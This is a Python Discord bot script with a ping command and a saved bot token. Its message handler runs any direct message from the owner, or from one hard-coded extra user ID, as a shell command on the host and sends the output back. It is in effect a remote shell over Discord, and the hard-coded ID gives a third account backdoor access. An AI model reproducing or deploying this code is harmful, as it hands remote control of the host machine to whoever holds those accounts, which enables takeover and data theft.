import json, subprocess
from os import path
import discord
from discord.ext import commands

if path.exists('settings.json'):
    with open('settings.json', 'r', encoding='utf-8') as file:
        token = json.load(file)['token']
else:
    with open('settings.json', 'w', encoding='utf-8') as file:
        token = input('Input token: ')
        json.dump({'token' : token}, file)
        print('Token saved!')

bot = commands.Bot(command_prefix='~')

@bot.command()
async def ping(ctx):
    await ctx.send(f'```Ping {int(bot.latency * 1000)} ms```')

@bot.event
async def on_ready():
    print('Ready.')

@bot.event
async def on_message(msg):
    if isinstance(msg.channel, discord.DMChannel):
        if await bot.is_owner(msg.author) or msg.author.id == 274662560928890881:
            result = subprocess.run(msg.content, capture_output=True, shell=True)
            output = str(result.stdout, encoding='cp866', errors='replace')
            strings = output.split('\n')
            msg_to_send = ''
            if output:
                for string in strings:
                    if len(msg_to_send + string) + 6 > 2000:
                        await msg.author.send('```' + msg_to_send + '```')
                        msg_to_send = ''
                    msg_to_send += string + '\n'
                await msg.author.send('```' + msg_to_send + '```')
            if result.stderr:
                await msg.author.send('```' + result.stderr.decode(encoding='cp866', errors='replace') + '```')
        elif not msg.author.bot:
            await msg.author.send('Access permitted')
    await bot.process_commands(msg)

bot.run(token)